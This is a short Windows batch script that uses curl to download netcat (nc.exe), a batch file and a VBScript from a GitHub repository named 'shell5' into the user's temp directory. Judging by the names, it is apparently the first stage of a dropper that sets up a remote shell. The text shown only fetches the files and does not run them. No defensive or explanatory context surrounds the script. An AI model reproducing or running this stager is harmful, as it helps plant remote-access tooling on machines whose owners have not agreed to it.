@echo off
curl https://raw.githubusercontent.com/0x2034/shell5/main/nc.exe -o %temp%\nc.exe
curl https://raw.githubusercontent.com/0x2034/shell5/main/pro.bat -o %temp%\pro.bat
curl https://raw.githubusercontent.com/0x2034/shell5/main/start.vbs -o %temp%\start.vbs
